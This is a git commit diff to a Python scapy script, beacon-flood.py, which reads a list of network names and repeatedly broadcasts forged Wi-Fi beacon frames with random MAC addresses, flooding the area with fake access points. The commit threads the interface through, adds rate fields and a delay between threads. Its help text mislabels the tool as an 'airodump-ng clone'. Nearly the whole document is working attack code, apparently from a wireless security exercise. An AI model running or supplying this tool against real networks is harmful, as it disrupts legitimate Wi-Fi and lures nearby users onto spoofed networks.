6e747459d005dce703e92fd21508c0d9863c9d3c
Ur$obad <66944342+AliceLacie@users.noreply.github.com>
2023-01-16 10:12:17 +0900

    Add sleep..

--- beacon-flood.py
+++ beacon-flood.py
@@ -3,36 +3,36 @@ import threading
 from random import randrange
 import argparse
 from argparse import RawTextHelpFormatter
+from time import sleep
 
-# from scapy.config import conf
 def random_mac_addr():
     random_list = [format(randrange(0,256), '02x') for i in range(6)]
     return ':'.join(random_list)
 
-def beacon_flood(SSID):
+def beacon_flood(SSID, iface):
     rmac_add = random_mac_addr()
     base_pkt = Dot11(type=0, subtype=8, addr1 = 'ff:ff:ff:ff:ff:ff', addr2 = rmac_add, addr3 = rmac_add)
     beacon = Dot11Beacon(cap='ESS+privacy')
     essid = Dot11Elt(ID='SSID', info=SSID, len=len(SSID))
-    rate=Dot11EltRates(rates=[130])
+    rate=Dot11EltRates(rates=[0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c])
     rsn = Dot11EltRSN(ID=48, group_cipher_suite=RSNCipherSuite(cipher=0x4), pairwise_cipher_suites=RSNCipherSuite(cipher=0x04), akm_suites=[RSNCipherSuite(cipher=0x02)])
 
     frame = RadioTap()/base_pkt/beacon/essid/rate/rsn
     print(frame)
     sendp(frame, iface=iface, verbose=False, loop=1, inter=0.1)
 
-parser = argparse.ArgumentParser(description='beacon-flood\n\nusage: python3 beacon-flood.py <interface> <ssid-list-file>',formatter_class=RawTextHelpFormatter)
+parser = argparse.ArgumentParser(description='airodump-ng clone\n\nusage: python3 airodump-ng.py <interface>',formatter_class=RawTextHelpFormatter)
 parser.add_argument('iface', help='<interface>')
 parser.add_argument('ssid_list', help='<ssid-list-file>')
 
 args = parser.parse_args()
 
-# conf.logLevel = 0
 with open(args.ssid_list, 'rb') as f:
     SSID_list = f.read().decode().split('\n')[:-1]
 
 iface = args.iface
 
 for SSID in SSID_list:
-    t = threading.Thread(target=beacon_flood, args=(SSID, ))
+    t = threading.Thread(target=beacon_flood, args=(SSID, iface))
     t.start()
+    sleep(1)
